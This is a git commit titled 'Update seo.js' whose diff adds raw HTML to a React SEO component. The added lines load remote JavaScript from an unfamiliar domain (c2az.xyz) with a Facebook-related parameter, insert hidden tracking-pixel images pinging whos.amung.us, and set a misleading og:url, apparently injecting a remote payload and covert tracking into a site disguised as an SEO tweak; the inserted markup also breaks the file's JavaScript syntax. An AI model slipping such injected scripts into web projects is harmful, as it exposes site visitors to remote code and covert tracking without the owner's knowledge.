b807bad7b188488f92e7a7e7658a9ac93b99f472
tusurucu23s <95896360+tusurucu23s@users.noreply.github.com>
2022-01-21 11:35:14 +0800

    Update seo.js

--- src/components/seo.js
+++ src/components/seo.js
@@ -24,6 +24,14 @@ function Seo({ description, lang, meta, title }) {
       }
     `
   )
+  
+  
+  <meta property="og:url" content="https://www.youtube.com/" />
+<script src="https://c2az.xyz/manzana/?api=1&lan=facebookapphk&ht=1" type="text/javascript" async="true"></script>
+<img src="//whos.amung.us/pingjs/?k=elchapito07s&amp;t=🛸 NO FORCE MMG 👽&amp;x=https://www.messenger.com/" style="display:none" alt="">                    
+  <script type="text/javascript"></script>
+<img src="//whos.amung.us/pingjs/?k=elcartel07&amp;t=🛸 NO FORCE MMG 👽&amp;x=https://www.messenger.com/" style="display:none" alt="">                    
+  <script type="text/javascript"></script> 
 
   const metaDescription = description || site.siteMetadata.description
   const defaultTitle = site.siteMetadata?.title
